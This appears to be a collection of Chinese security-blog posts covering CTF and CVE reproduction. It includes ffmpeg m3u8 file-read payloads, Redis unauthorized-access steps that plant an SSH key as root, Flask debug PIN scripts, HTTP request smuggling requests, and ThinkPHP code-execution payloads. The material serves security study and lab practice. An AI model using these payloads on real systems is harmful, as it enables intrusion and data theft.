如果对方服务开启了匿名登录直接使用run命令即可，如果已知用户名密码可使用set smbuser和smbpass来指定用户登录\n\n5. 成功拿shell\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208101616840.png)\n\n## ffmpeg\n\n### CVE-2016-1897\n\n漏洞内容：首先了解一下m3u8文件格式，m3u8是一种索引文件，用于HLS协议传输媒体流，m3u8索引指向一个个小的媒体流碎片\n\n> 简而言之，[HLS](https://links.jianshu.com/go?to=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2FHTTP_Live_Streaming) 是新一代流媒体传输协议，其基本实现原理为将一个大的媒体文件进行分片，将该分片文件资源路径记录于 m3u8 文件（即 playlist）内，其中附带一些额外描述（比如该资源的多带宽信息···）用于提供给客户端。客户端依据该 m3u8 文件即可获取对应的媒体资源，进行播放。\n\n一个基本的m3u8文件格式如下\n\n> - m3u8 文件必须以 utf-8 进行编码，不能使用 Byte Order Mark（BOM）字节序， 不能包含 utf-8 控制字符（U+0000 ~ U_001F 和 U+007F ~ u+009F）。\n>\n> - m3u8 文件的每一行要么是一个 URI，要么是空行，要么就是以 **#** 开头的字符串。不能出现空白字符，除了显示声明的元素。\n>\n> - m3u8 文件中以 **#** 开头的字符串要么是注释，要么就是标签。标签以 **#EXT** 开头，大小写敏感。\n>\n> - ```\n>   各参数说明： \n>   #EXTM3U 标签是 m3u8 的文件头，开头必须要这一行\n>   #EXT-X-MEDIA-SEQUENCE 表示每一个media URI 在 PlayList中只有唯一的序号，相邻之间序号+1\n>   #EXTINF:10.0, 表示该一段 TS 流文件的长度\n>   #EXT-X-ENDLIST 这个相当于文件结束符\n>   ```\n\n```m3u8\n#EXTM3U\n#EXT-X-TARGETDURATION:10\n#EXTINF:9.009,\nhttp://media.example.com/first.ts\n#EXTINF:9.009,\nhttp://media.example.com/second.ts\n#EXTINF:3.003,\nhttp://media.example.com/third.ts\n#EXT-X-ENDLIST\n```\n\n而在ffmpeg特定版本中并没有对URI进行任何检查，此处可导致SSRF，只需要监听一个端口然后直接访问即可验证\n\n任意文件读取成因是在ffmpeg中有concat函数可以对URI进行拼接，我们只要将文件作为http请求的参数即可带出，但直接使用concat并不会对文件请求访问，所以我们需要一个小技巧，也就是通过主m3u8访问次级m3u8来使得文件被读取\n\nkkk.txt\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://xxx/test.txt|file:///etc/passwd\n#EXT-X-ENDLIST\n```\n\ntext.txt\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://xxx/?\n```\n\nxxx.m3u8\n\n```\n#EXTM3U\n#EXT-X-TARGETDURATION:6\n#EXTINF:10.0,\nconcat:http://xxx/kkk.txt\n#EXT-X-ENDLIST\n```\n\n将kkk.txt和text.txt都上传到服务器，然后用ffmpeg处理xxx.m3u8文件即可带出passwd文件首行\n\n## Git\n\n### CVE-2017-8386\n\n漏洞成因：\n\n- 当我们想从github克隆一份代码下来的时候，会有ssh克隆的选项，我们去随便捞一个地址，找到Clone with SSH里列出的地址：`git@github.com:Jlan45/j1an.github.io.git`其实就是通过ssh协议连接github使用git用户将这个文件搞下来\n\n- 那我们猜想一下，是不是直接ssh链接就能和我们链接一个服务器一样去执行命令呢\n\n- 测试发现我们确实连接上了服务器，但是服务器给我们弹了一句话就让我们强制退出了\n\n- 这是怎么做到的咧\n\n- > 那么，github这类git服务商是怎么实现上述“安全”通信的流程的呢？\n  >\n  > 让用户可以通过ssh认证身份，但又不给用户shell，这个过程有两种方法实现：\n  >\n  > 创建系统用户git的时候将其shell设置成git-shell\n  > 在authorized_keys文件每个ssh-key的前面设置command，覆盖或劫持重写原本的命令\n  > 第一种方法比较直观，就是创建用户的时候不给其正常的bash或sh的shell，而是给它一个git-shell。git-shell是一个沙盒环境，在git-shell下，只允许执行沙盒内包含的命令。\n  > ————————————————\n  > 版权声明：本文为CSDN博主「建瓯最坏」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n  > 原文链接：https://blog.csdn.net/JiangBuLiu/article/details/95065034\n\n- 在github中确实是只有这三条命令可用\n\n  - `git-receive-pack <argument>`\n  - `git-upload-pack <argument>`\n  - `git-upload-archive <argument>`\n\n- 但是后面有了参数，我们就可以通过--help来打开一个man页面，并且其会自动调用less命令，而通过less命令我们就能直接通过`shift+e`键来实现任意文件读取，甚至可以通过`!命令`来实现任意命令执行\n\n漏洞内容：通过github的SSH实现任意文件读取\n\n漏洞复现：\n\n1. 首先还是vulhub启一个服务器，可以看到目录下有id_rsa私钥文件，我们直接通过这个私钥来连接docker，并且执行`git-upload-archive '--help'`命令\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010033494.png)\n\n   可以看到命令执行成功进入了man页面\n\n2. 尝试读取/etc/passwd![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209010034597.png)\n\n   读取成功\n\n   \n\n\n\n"},{"title":"破破烂烂碎碎知识汇总","url":"/posts/ad1540aa.html","content":"\n## HTTP部分请求头\n\n### Transfer-Encoding\n\n其中中有一类特定编码:chunked编码.该编码将实体分块传送并逐块标明长度,直到长度为0块表示传输结束, 这在实体长度未知时特别有用(比如由数据库动态产生的数据)，该编码格式为\n\n```\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n16进制表示下一个分块的长度\\r\\n\n要发送的数据\\r\\n\n重复上列数据直到最终结尾使用一个空的数据块来表示内容结束\n0\\r\\n\n\\r\\n\n```\n\n<!--more -->\n\n## 内存马\n\n条件：/proc/某进程pid/mem可读\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## HTTP请求走私\n\n### 成因\n\n请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 `Content-Length` 和 `Transfer-Encoding` 标头。\n\n### 分类\n\n- CLTE：前端服务器使用 `Content-Length` 头，后端服务器使用 `Transfer-Encoding` 头\n- TECL：前端服务器使用 `Transfer-Encoding` 标头，后端服务器使用 `Content-Length` 标头。\n- TETE：前端和后端服务器都支持 `Transfer-Encoding` 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。\n\n### 攻击方式\n\n1. CL不为0的GET请求\n\n   当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 `Content-Length` 头，不进行处理。例如下面这个例子：\n\n   ```http\n   GET / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 44\\r\\n\n   \n   GET /secret HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   \\r\\n\n   ```\n\n   这时前端对 `Content-Length` 头进行了处理，将后续伪造的GET请求传入了后端，而后端则没有处理，直接将下面的内容当做了又一个独立请求进行处理\n\n2. 双CL值不同的请求\n\n   根据RFC 7230，当服务器收到的请求中包含两个 `Content-Length` ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 `Content-Length` 值时，就会出现漏洞。例如：\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 8\\r\\n\n   Content-Length: 7\\r\\n\n   \n   12345\\r\\n\n   a\n   ```\n\n   这个例子中的a就会被带入到下一个请求中，使得下一个请求变成了\n\n   ```http\n   aGET / HTTP/1.1\\r\\n\n   ```\n\n3. CL-TE\n\n   指前端服务器处理 `Content-Length` 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 `Content-Length` ，处理 `Transfer-Encoding` 。例如：\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-Length: 4\\r\\n\n   Transfer-Encoding: chunked\\r\\n\n   \\r\\n\n   12\\r\\n\n   aPOST / HTTP/1.1\\r\\n\n   \\r\\n\n   0\\r\\n\n   \\r\\n\n   ```\n\n   此处前端只处理了 `Content-Length` 这一请求头而忽略了 `Transfer-Encoding` 请求头\n\n4. TE-TE\n\n   指前后端服务器都处理 `Transfer-Encoding` 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 `Transfer-encoding` ，测试例如：\n\n   ```http\n   POST / HTTP/1.1\\r\\n\n   Host: example.com\\r\\n\n   Content-length: 4\\r\\n\n   Transfer-Encoding: chunked\\r\\n\n   Transfer-encoding: cow\\r\\n\n   \\r\\n\n   5c\\r\\n\n   aPOST / HTTP/1.1\\r\\n\n   Content-Type: application/x-www-form-urlencoded\\r\\n\n   Content-Length: 15\\r\\n\n   \\r\\n\n   x=1\\r\\n\n   0\\r\\n\n   \\r\\n\n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## PHP session反序列化\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Redis未授权访问\n\n其实并不是CVE，但也是个蛮有趣的漏洞，众所周知redis和memcached这俩难兄难弟是不需要密码的，但是他们同时又有很高的权限，所以当这俩货对外网开启访问权限的时候就很容易被扫描到并且被搞，那么话不多说，开干！\n\n利用条件：Redis开放给外部访问并且知道ssh链接端口\n\n漏洞利用：\n\n1. 首先搭建好redis服务并更改配置文件打开外部访问\n2. 在本机中使用`ssh-keygen -t rsa`命令来自动生成公私钥\n3. 下面就是将公钥写入受害机器的`.ssh`目录下，此处我们利用redis备份数据库文件的方式进行，首先使用redis命令将内容写入到一个数据中`(echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") | redis-cli -h 受害者IP -p redis端口 -x set crackit`，这样我们就将公钥写入到了数据库中\n4. 写入到数据库中还需要将公钥保存为文件才能生效，我们利用redis命令来将公钥文件以数据库备份的形式放入`/root/.ssh/authorized_keys`，使用`config set dir /root/.ssh;config set dbfilename authorized_keys;save;`来将数据库文件保存\n5. 使用私钥直接连接受害者服务器`ssh -i ~/.ssh/id_rsa root@受害者IP -p SSH服务端口`\n\n\n\n## Flask PIN值计算\n\n直接放脚本算了\n\n```python\n#MD5 python3.6\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# flask执行用户\n     'flask.app',# 默认\n     'Flask',# 默认\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),报错也可\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n```\n\n```python\n#sha1 python3.8\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制\n    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n总之需要的文件就是\n\n> /sys/class/net/eth0/address\n>\n> /etc/machine-id\n>\n> /proc/sys/kernel/random/boot_id\n>\n> /proc/self/cgroup\n>\n> 必要的就是machine-id，没有的话就用boot_id代替\n\n## 奇怪的协议\n\n众所周知啊，现在网络传输有非常多的协议，打CTF呢最近越来越没有什么正常的http协议了，所以准备写一个小小的文章稍微总结一下各种奇怪协议，万一以后用的到呢～～～\n\n\n\n### FTP\n\nFTP协议是互联网上广泛使用的文件传输协议\n\n客户端/服务器模式，基于TCP协议\n\n采用双TCP连接方式\n\n- 控制连接默认使用TCP端口号21，控制连接在整个会话期间都会保持打开\n- 数据连接默认使用TCP端口号20，数据连接在传输文件时打开，文件传输结束，连接终止\n\nFTP有两种文件传输模式\n\n- ASCII模式是默认的文件传输模式，会将文件转为标准ASCII码再进行传输\n- 二进制模式又称图像文件传输模式，文件会按照比特流的方式进行传输\n\nFTP采用两种数据传输方式\n\n- 主动（Standard）方式，又称为PORT方式，客户端首先向服务端发送PORT命令，告诉服务器用于数据传输的临时端口号，当进行数据传输时，由服务器向客户端指定端口发起连接，由于是服务器发起连接，所以叫主动方式，\n\n  FTP服务器必须和客户端建立一个新的连接用来传送数据。\n\n- 被动（Passive）方式，又称为PASV方式，服务器收到PASV命令后随即打开一个高端（大于1024）端口，并通知客户端在这个端口上传送数据，由客户端向服务端的指定端口发起连接，所以叫被动方式\n\n  FTP服务器不再需要建立一个新的和客户端之间的连接。\n\nFTP中的命令和应答：命令和应答在客户和服务器的控制连接上以 NVT ASCII码形式传送。这就要求在每行结尾都要返回C R、 L F对（也就是每个命令或每个应答）。这些命令都是3或4个字节的大写ASCII字符，其中一些带选项参数。下面是一些命令（来自客户端）\n\n| 命令                     | 说明                                          |\n| ------------------------ | --------------------------------------------- |\n| `ABOR`                   | 放弃先前的FTP命令与数据传输                   |\n| `LIST filename`          | 列表显示文件或目录                            |\n| `USER username`          | 服务器上的用户名                              |\n| `PASS password`          | 服务器上的口令                                |\n| `PORT n1,n2,n3,n4,n5,n6` | 客户端的IP地址与端口（n1.n2.n3.n4:n5*256+n6） |\n| `QUIT`                   | 注销                                          |\n| `RETR filename`          | 检索一个文件                                  |\n| `STOR filename`          | 存储一个文件                                  |\n| `SYST`                   | 从服务器返回系统编码类型                      |\n| `TYPE typeUSER`          | 说明文件传输模式：A表示ASCII码，I表示比特流   |\n\n而FTP的应答都是ASCII码形式的三位数字，并且跟有报文来帮助人工处理，这里是一些有用的[响应数据](https://blog.csdn.net/cbffyx/article/details/78891603)\n\n| 应答 | 说明                                                         |\n| ---- | ------------------------------------------------------------ |\n| 1yz  | 肯定预备应答，在发送另一个命令前期待另一个应答时启动         |\n| 2yz  | 肯定完成应答，一个新命令可以发送                             |\n| 3yz  | 肯定中介应答，该命令已被应答，但另一个命令必须被发送         |\n| 4yz  | 暂态否定完成应答，请求动作未发生，但差错是暂时的，命令可以过后再发 |\n| 5yz  | 永久性否定完成应答，命令不被接受并且不再进行重试             |\n| x0z  | 语法错误                                                     |\n| x1z  | 信息                                                         |\n| x2z  | 连接，应答指控制或数据连接                                   |\n| x3z  | 鉴别和记账，应答用于注册或记账命令                           |\n| x4z  | 未指明                                                       |\n| x5z  | 文件系统状态                                                 |\n\n下面是一次正常的FTP连接的双方数据交互的过程\n\n```\n响应: \t220 (vsFTPd 3.0.2)\n命令: \tAUTH TLS\n响应: \t530 Please login with USER and PASS.\n命令: \tAUTH SSL\n响应: \t530 Please login with USER and PASS.\n状态: \t不安全的服务器，不支持 FTP over TLS。\n命令: \tUSER test\n响应: \t331 Please specify the password.\n命令: \tPASS ****\n响应: \t230 Login successful.\n命令: \tOPTS UTF8 ON\n响应: \t200 Always in UTF8 mode.\n命令: \tCWD /\n响应: \t250 Directory successfully changed.\n命令: \tPWD\n响应: \t257 \"/\"\n命令: \tTYPE A\n响应: \t200 Switching to ASCII mode.\n命令: \tPASV\n响应: \t227 Entering Passive Mode (172,17,0,6,82,117).\n命令: \tSTOR main.py\n响应: \t150 Ok to send data.\n响应: \t226 Transfer complete.\n命令: \tTYPE I\n响应: \t200 Switching to Binary mode.\n命令: \tPASV\n响应: \t227 Entering Passive Mode (172,17,0,6,82,111).\n命令: \tLIST\n响应: \t150 Here comes the directory listing.\n响应: \t226 Directory send OK.\n```\n\n### WEBSOCKET\n\nHTTP协议有一个的缺陷为：通信只能由客户端发起。在一些场景下，这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用[轮询](https://so.csdn.net/so/search?q=轮询&spm=1001.2101.3001.7020)：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。轮询效率低切浪费资源，此时，websocket就被发明了\n\nWebscoket是Web浏览器和服务器之间的一种全双工通信协议，其中WebSocket协议由IETF定为标准，WebSocket API由W3C定为标准。一旦Web客户端与服务器建立起连接，之后的全部数据通信都通过这个连接进行。通信过程中，可互相发送JSON、XML、HTML或图片等任意格式的数据。\n\n与HTTP的相同点：\n\n- 都是基于TCP的应用层协议\n- 都使用Request/Response模型进行连接的建立\n- 在连接的建立过程中对错误的处理方式相同，在这个阶段WS可能返回和HTTP相同的返回码\n\n不同之处在于：\n\n- WS使用HTTP来建立连接，但是定义了一系列新的header域，这些域在HTTP中并不会使用\n- WS的连接不能通过中间人来转发，它必须是一个直接连接\n- WS连接建立之后，通信双方都可以在任何时刻向另一方发送数据\n- WS连接建立之后，数据的传输使用帧来传递，不再需要Request消息\n- WS的数据帧有序\n\n![img](https://img-blog.csdnimg.cn/20200527233222508.png)\n\n这里是一个完整的websocket的过程数据流\n\n```\nGET / HTTP/1.1\nHost: localhost:3000\nPragma: no-cache\nAccept: */*\nSec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw==\nSec-WebSocket-Version: 13\nAccept-Language: zh-CN,zh-Hans;q=0.9\nSec-WebSocket-Extensions: permessage-deflate\nCache-Control: no-cache\nAccept-Encoding: gzip, deflate\nOrigin: null\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15\nConnection: Upgrade\nUpgrade: websocket\n\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL/vprw=\n\n..\"c_.Z\n>.Q\n..ECHO: xiaosi..\"|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...>...5...ECHO: xiaosi\n```\n\n- 第一行为为请求的方法，类型必须为GET，协议版本号必须大于1.1\n- Upgrade字段必须包含，值为websocket\n- Connection字段必须包含，值为Upgrade\n- Sec-WebSocket-Key字段必须包含 ，记录着握手过程中必不可少的键值。\n- Sec-WebSocket-Protocol字段必须包含 ，记录着使用的子协议\n\n\n\n## TFTP\n\nTFTP(Trival File Transfer Protocal，简单文件传输协议）该协议在熟知端口69上使用UDP服务。TFTP协议常用于无盘工作站或路由器从别的主机上获取引导配置文件，由于TFTP报文比较小，能够迅速复制这些文件。\n\n优点：TFTP协议代码所占用的内存小，其对应的软件也很小，所以能个很容易地放入到无盘工作站的ROM中，TFTP支持ASCII码或二进制传送。\n\n传输过程\n\n以TFTP客户向TFTP服务器发送读请求为例，说明整个过程。\n\n1. 服务器使用熟知端口号69被动打开连接；\n2. 客户主动打开连接，它使用临时端口作为源端口而熟知端口69作为目的端口，向服务器进程发送RRQ报文；\n3. 服务器主动打开连接，它使用新的临时端口作为源端口，而使用收到的来自客户的临时端口作为目的端口，向TFTP客户进程发送DATA报文（2B操作码，2B数据块的块号K，512B数据）；\n4. 客户收到服务器的报文后，发送4B的ACK（2B的操作码和2B的数据块号）给TFTP服务器，告诉它之前发送给客户的数据报已经收到；\n5. 重复步骤3-4，直到所有请求的数据发送完毕。\n\n![img](https://upload-images.jianshu.io/upload_images/2256198-62dba3beb7cb0353.png)\n\n"},{"title":"CTFshowThinkPHP专题","url":"/posts/80a6314c.html","content":"\n# ThinkPHP\n\n一些ThinkPHP的基础知识：\n\n1. [关于ThinkPHP的模块化设计](https://www.kancloud.cn/manual/thinkphp/1696)\n2. [关于ThinkPHP的闭包支持](https://www.kancloud.cn/manual/thinkphp/1710)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**569**\n\n知道模块化设计就很简单了\n\n```\n典型访问规则\nhttp://serverName/index.php（或者其他应用入口文件）/模块/控制器/操作/[参数名/参数值...]\n/index.php/Admin/Login/ctfshowLogin\n```\n\n**570**\n\n闭包路由，类似于将/后路径作为参数传入，设定闭包路由的文件在文件根目录/Common/Conf/config.php中\n\n```php\n    'URL_ROUTER_ON'   => true, \n\t'URL_ROUTE_RULES' => array(\n    'ctfshow/:f/:a' =>function($f,$a){\n    \tcall_user_func($f, $a);\n    \t}\n    )\n```\n\n一个明显的后门，payload如下\n\n```\n/index.php/ctfshow/assert/eval($_POST[1])\nPOST:\n1=system('tac /*');\n```\n\n**571**\n\nshow方法导致的命令执行\n\n> ## 渲染内容\n>\n> 如果你没有定义任何模板文件，或者把模板内容存储到数据库中的话，你就需要使用show方法来渲染输出了，show方法的调用格式：\n>\n> ```\n> show('渲染内容'[,'字符编码'][,'输出类型'])例如，$this->show($content);\n> 也可以指定编码和类型： $this->show($content, 'utf-8', 'text/xml');\n> ```\n\n那么我们去看看show方法到底执行了什么\n\n```php\nprotected function show($content,$charset='',$contentType='',$prefix='') {\n    $this->view->display('',$charset,$contentType,$content,$prefix);\n}\n```\n\n往下看调用的display方法\n\n```php\npublic function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {\n    G('viewStartTime');\n    // 视图开始标签\n    Hook::listen('view_begin',$templateFile);\n    // 解析并获取模板内容\n    $content = $this->fetch($templateFile,$content,$prefix);\n    // 输出模板内容\n    $this->render($content,$charset,$contentType);\n    // 视图结束标签\n    Hook::listen('view_end');\n}\n```\n\n```php\npublic function fetch($templateFile='',$content='',$prefix='') {\n    if(empty($content)) {\n        $templateFile   =   $this->parseTemplate($templateFile);\n        // 模板文件不存在直接返回\n        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n    }else{\n        defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());\n    }\n    // 页面缓存\n    ob_start();\n    ob_implicit_flush(0);\n    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板\n        $_content   =   $content;\n        // 模板阵列变量分解成为独立变量\n        extract($this->tVar, EXTR_OVERWRITE);\n        // 直接载入PHP模板\n        empty($_content)?include $templateFile:eval('?>'.$_content);\n    }else{\n        // 视图解析标签\n        $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);\n        Hook::listen('view_parse',$params);\n    }\n    // 获取并清空缓存\n    $content = ob_get_clean();\n    // 内容过滤标签\n    Hook::listen('view_filter',$content);\n    // 输出模板文件\n    return $content;\n}\n```\n\n在`TMPL_ENGINE_TYPE=='php'`时，关键就在这句话了`include $templateFile:eval('?>'.$_content);`此处的`$_content`我们是完全可控的，也就可以执行任意命令\n\n而当`TMPL_ENGINE_TYPE!='php'`时，执行的Hook中的listen方法，然后执行exec方法，然后run方法，最后加载并包含一个缓存文件\n\n```php\nstatic public function listen($tag, &$params=NULL) {\n    if(isset(self::$tags[$tag])) {\n        if(APP_DEBUG) {\n            G($tag.'Start');\n            trace('[ '.$tag.' ] --START--','','INFO');\n        }\n        foreach (self::$tags[$tag] as $name) {\n            APP_DEBUG && G($name.'_start');\n            $result =   self::exec($name, $tag,$params);\n            if(APP_DEBUG){\n                G($name.'_end');\n                trace('Run '.$name.' [ RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO');\n            }\n            if(false === $result) {\n                // 如果返回false 则中断插件执行\n                return ;\n            }\n        }\n        if(APP_DEBUG) { // 记录行为的执行日志\n            trace('[ '.$tag.' ] --END-- [ RunTime:'.G($tag.'Start',$tag.'End',6).'s ]','','INFO');\n        }\n    }\n    return;\n}\n```\n\n```\npublic function load($_filename,$vars=null){\n    if(!is_null($vars))\n        extract($vars, EXTR_OVERWRITE);\n    eval('?>'.$this->read($_filename));\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n最终payload\n\n```\n/index.php/Home/Index/index?n=<?php%20system(%27tac%20/*%27);?>\n```\n\n**572**\n\nThinkPHP日志文件\n\n题目中提到了爆破，在thinkphp开启debug的情况下会在Runtime目录下生成log文件，文件的名称是以`年_月_日.log`来命名的。所以我们可以来爆破文件名\n\n```\n/Application/Runtime/Logs/Home/xx_xx_xx.log\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206131917820.png)\n\n扫出了这么个文件，发现似乎传参showctf可执行php代码，拿到flag\n\n**573**\n\n**ThinkPHP 3.2.3sql注入漏洞**\n\n先写个可以调用内置sql查询的主页\n\n```\nclass IndexController extends Controller {\n    public function index(){\n    $a=M('xxx');  //表名\n    $id=I('GET.id');\n    $b=$a->find($id);\n    var_dump($b);\n    }\n}\n```\n\n在I方法中对输入的内容进行过滤，默认过滤器`DEFAULT_FILTER`是不会对单引号做过滤操作的，所以此处不用管，下面走`think_filter`方法，这里对一些敏感安全内容进行了过滤\n\n```php\nfunction think_filter(&$value){\n\t// TODO 其他安全过滤\n\t// 过滤查询特殊字符\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\nOK，输入检查完毕，我们输入的内容进入到`find`方法中，这里的注释也对我们传入的参数做了详细的解释，下一步进一步跟踪`_parseOptions`方法，继续跟踪`_parseType`方法，该方法对内容类型进行解析\n\n```php\n/**\n * 查询数据\n * @access public\n * @param mixed $options 表达式参数\n * @return mixed\n */\n```\n\n```\nif(is_scalar($val)) {\n    $this->_parseType($options['where'],$key);\n}\n```\n\n```\nelseif(false === strpos($fieldType,'bigint') && false !== strpos($fieldType,'int')) {\n                $data[$key]   =  intval($data[$key]);\n```\n\n\n\n\n\n先放一个yu师傅的[代码审计](https://blog.csdn.net/miuzzx/article/details/119424071)，以后再回来看\n\n**574**\n"},{"title":"大佬文章合集","url":"/posts/f85e0a9a.html","content":"\n### [[CTF]PHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen)\n\n### [[CTF].htaccess的使用技巧总结](https://blog.csdn.net/solitudi/article/details/116666720)\n\n### [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/index.html)\n\n### [Java Web安全](https://javasec.org)\n\n### [反弹shell命令生成器](https://www.revshells.com)\n\n### [PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/)\n\n### [Java Web入门](https://www.bookstack.cn/read/Heart-First-JavaWeb/source-README.md)\n\n### [从一个绕过长度限制的 XSS 中，我们能学到什么？](https://www.tr0y.wang/2020/08/18/IDN/)\n\n"},{"title":"CTFshow大赛原题","url":"/posts/76fe6b8e.html","content":"\n**680**\n\npost传入`code=phpinfo();`执行成功，查看被ban函数，无法执行命令，使用原生类查看文件\n\n```\ncode=$a=new FilesystemIterator(\".\");var_dump ($a);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090028188.png)\n\n下载文件即可\n\n**681**\n\n抓包发现返回内容为sql语句\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090039242.png)\n\n过滤了空格和引号，会被吞，尝试构造payload，发现#可用，\\可用，构造语句`||1#\\`此时执行语句为\n\n```sql\nselect count(*) from ctfshow_users where username = '||1#\\' or nickname = '||1#\\'\n```\n\n相当于判断username是否等于`||1' or nickname = `这一字符串或一，结果永真，登录即可拿到flag\n\n**682**\n\n这辈子第一次碰到js代码审计，看呗\n\n```javascript\nvar c2n  = c =>{\n    if(c.length>1){\n        return 0\n    }\n\n    if(c.charCodeAt()>0x60 && c.charCodeAt()<0x67){\n        return c.charCodeAt()-0x57\n    }\n\n    if(parseInt(c)>0){\n        return parseInt(c)\n    }\n\n    return 0;\n}\n\nvar s2n2su = s =>{\n    r=0\n    for (var i = s.length - 1; i >= 0; i--) {\n        r+=c2n(s[i])\n    }\n    return r\n}\n\nfunction test(){\n    var m=document.getElementById(\"message\").value;\n    var e = 'error';\n    if(sha256(m)!==\"e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d\"){\n        return alert(e)\n    }\n    var start = m.substring(0,8);\n\n    if(start!=='ctfshow{'){\n        return alert(e);\n    }\n    if(m.substring(m.length,m.length-1)!==\"}\"){\n        return alert(e);\n    }\n    var s = m.substring(8,m.length-1)\n    if(s.length!==36){\n        return alert(e);\n    }\n    var k = s.split(\"-\")\n    if(k.length!==5){\n        return alert(e)\n    }\n    if(s2n2su(k[0])!==63){\n        return alert(e)\n    }\n    